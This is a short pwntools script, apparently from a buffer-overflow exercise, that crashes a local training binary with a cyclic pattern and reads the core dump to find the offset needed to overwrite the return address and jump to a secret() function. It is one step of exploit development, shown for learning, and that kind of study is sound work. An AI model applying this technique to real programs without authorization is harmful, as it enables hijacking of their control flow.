#!/bin/python3
# This code will calculate the offset that is required as padding to overwrite rsp with the address of secret().
import pwn
import os

pty = pwn.process.PTY
file_dir = os.path.abspath(os.path.dirname(__file__))
p = pwn.process(f"{file_dir}/../c/buffer_overflow", stdin=pty, stdout=pty)

input_prompt = b"Enter password:"
p.recvuntil(input_prompt, timeout=1)

p.sendline(pwn.cyclic(0xff))
p.wait()
# Read the stack trace that was generated because of the segmentation fault
# This can be done manually with gdb as well
core = p.corefile
rsp_value = core.rsp
print(f"RSP value: {hex(rsp_value)}")

# Read the first four bytes of the rsp and check where they are located in the cyclic string.
# This will be the required offset
pattern = core.read(rsp_value, 4)
rip_offset = pwn.cyclic_find(pattern)
print(f"Required offset: {rip_offset}")
